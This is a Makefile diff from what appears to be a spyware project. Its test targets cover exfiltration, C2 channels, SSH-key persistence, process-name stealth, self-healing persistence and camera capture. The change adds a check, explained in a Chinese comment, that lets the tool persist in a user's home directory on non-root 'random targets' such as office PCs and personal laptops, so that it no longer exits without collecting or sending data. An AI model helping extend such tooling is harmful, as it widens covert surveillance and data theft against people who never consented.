@@ -64,7 +64,7 @@ $(AGOBJS): FORCE
 
 FORCE:
 
-.PHONY: FORCE verify-cron-contract verify-v4l2-abi verify-exfil-fidelity
+.PHONY: FORCE verify-cron-contract verify-v4l2-abi verify-exfil-fidelity verify-user-deploy
 
 $(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
 	$(CC) $(CFLAGS) -c $< -o $@
@@ -344,7 +344,13 @@ verify-redline:
 verify-redline-guard:
 	@python3 ../redline/redline_guard.py
 
-test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience verify-uninstall-unit verify-uninstall-busy verify-persist-selfheal verify-redline verify-redline-guard $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol verify-cron-contract verify-v4l2-abi verify-exfil-fidelity
+# 用户级部署守卫：非 root 随机目标上不再 DIE，而是切到 $HOME 落点并回退到
+# persist_user_ensure。此前非 root 一律"需要 root 权限"直接退出——随机目标
+# （办公机/个人笔记本，登录用户常非管理员）上零驻留、零采集、零回传。
+verify-user-deploy:
+	@python3 tests/verify_user_deploy.py
+
+test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience verify-uninstall-unit verify-uninstall-busy verify-persist-selfheal verify-redline verify-redline-guard verify-user-deploy $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol verify-cron-contract verify-v4l2-abi verify-exfil-fidelity
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
